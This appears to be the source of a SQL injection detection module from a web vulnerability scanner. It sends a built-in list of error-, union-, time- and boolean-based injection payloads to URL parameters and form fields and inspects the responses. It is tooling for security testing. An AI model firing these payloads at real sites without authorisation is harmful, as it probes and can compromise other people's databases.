"""
SQL Injection Detection Module
Tests for SQL injection vulnerabilities
"""

import logging
import time
from typing import Dict, List, Optional
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse

import requests

from config import DETECTION_CONFIG

logger = logging.getLogger(__name__)


class SQLiDetector:
    """
    SQL Injection vulnerability detector
    """
    
    def __init__(self, session: requests.Session, config: Dict):
        self.session = session
        self.config = config
        self.sqli_config = DETECTION_CONFIG['sql_injection']
        self.error_patterns = self.sqli_config['error_patterns']
        
        # SQL injection payloads
        self.payloads = [
            # Error-based
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "')) OR (('1'='1",
            
            # Union-based
            "' UNION SELECT NULL--",
            "\" UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            
            # Time-based
            "' AND SLEEP(5)--",
            "\" AND SLEEP(5)--",
            "' AND pg_sleep(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),5)--",
            
            # Boolean-based
            "' AND 1=1--",
            "' AND 1=2--",
            "\" AND 1=1--",
            "\" AND 1=2--",
        ]
        
        # Confirmatory payloads
        self.confirmatory = [
            "' AND 1=1--",
            "' AND 1=2--",
        ]
    
    def test_url_parameter(self, url: str, param_name: str) -> bool:
        """
        Test URL parameter for SQL injection
        """
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if param_name not in params:
                return False
            
            original_value = params[param_name][0]
            
            # Test error-based injection
            for payload in self.payloads:
                params[param_name] = payload
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.config['request_timeout']
                    )
                    
                    # Check for SQL error messages
                    response_text = response.text.lower()
                    for pattern in self.error_patterns:
                        if pattern.lower() in response_text:
                            # Confirm with second payload
                            if self._confirm_vulnerability(url, param_name, original_value):
                                logger.warning(f"SQLi confirmed in {param_name} at {url}")
                                return True
                
                except requests.Timeout:
                    # Potential time-based injection
                    if self._test_time_based(url, param_name, original_value):
                        return True
                except Exception as e:
                    logger.debug(f"Error testing SQLi: {e}")
                    continue
            
            return False
            
        except Exception as e:
            logger.error(f"SQLi test error: {e}")
            return False
    
    def test_form(self, form: Dict, url: str) -> Optional[Dict]:
        """
        Test form for SQL injection
        """
        try:
            action = form.get('action', url)
            method = form.get('method', 'GET')
            inputs = form.get('inputs', [])
            
            if not inputs:
                return None
            
            # Build test data
            test_data = {}
            for inp in inputs:
                if inp['type'] not in ['submit', 'button', 'image', 'file']:
                    test_data[inp['name']] = inp['value'] or 'test'
            
            results = {}
            
            for inp in inputs:
                if inp['type'] in ['submit', 'button', 'image', 'file']:
                    continue
                
                field_name = inp['name']
                
                for payload in self.payloads[:5]:  # Test first few payloads
                    test_data_copy = test_data.copy()
                    test_data_copy[field_name] = payload
                    
                    try:
                        if method == 'POST':
                            response = self.session.post(
                                action,
                                data=test_data_copy,
                                timeout=self.config['request_timeout']
                            )
                        else:
                            response = self.session.get(
                                action,
                                params=test_data_copy,
                                timeout=self.config['request_timeout']
                            )
                        
                        response_text = response.text.lower()
                        for pattern in self.error_patterns:
                            if pattern.lower() in response_text:
                                results[field_name] = {
                                    'payload': payload,
                                    'pattern_matched': pattern,
                                }
                                return results
                    
                    except Exception as e:
                        logger.debug(f"Form SQLi test error: {e}")
                        continue
            
            return None if not results else results
            
        except Exception as e:
            logger.error(f"Form SQLi test error: {e}")
            return None
    
    def _confirm_vulnerability(self, url: str, param_name: str, original_value: str) -> bool:
        """Confirm SQL injection with additional tests"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Test with benign and malicious payloads
            test_cases = [
                (f"{original_value}' AND '1'='1", f"{original_value}' AND '1'='2"),
                (f"{original_value}\" AND \"1\"=\"1", f"{original_value}\" AND \"1\"=\"2"),
            ]
            
            responses = []
            for payload_true, payload_false in test_cases:
                for payload in [payload_true, payload_false]:
                    params[param_name] = payload
                    new_query = urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    response = self.session.get(test_url, timeout=10)
                    responses.append(len(response.text))
            
            # If responses differ significantly, likely SQLi
            if len(responses) >= 2 and abs(responses[0] - responses[1]) > 100:
                return True
            
            return False
            
        except:
            return False
    
    def _test_time_based(self, url: str, param_name: str, original_value: str) -> bool:
        """Test for time-based SQL injection"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            time_payloads = [
                f"{original_value}' AND SLEEP({self.sqli_config['time_based_delay']})--",
                f"{original_value}\" AND SLEEP({self.sqli_config['time_based_delay']})--",
                f"{original_value}' AND pg_sleep({self.sqli_config['time_based_delay']})--",
            ]
            
            for payload in time_payloads:
                params[param_name] = payload
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                start_time = time.time()
                try:
                    self.session.get(test_url, timeout=2)
                except requests.Timeout:
                    elapsed = time.time() - start_time
                    if elapsed >= self.sqli_config['time_based_delay'] - 1:
                        return True
            
            return False
            
        except:
            return False
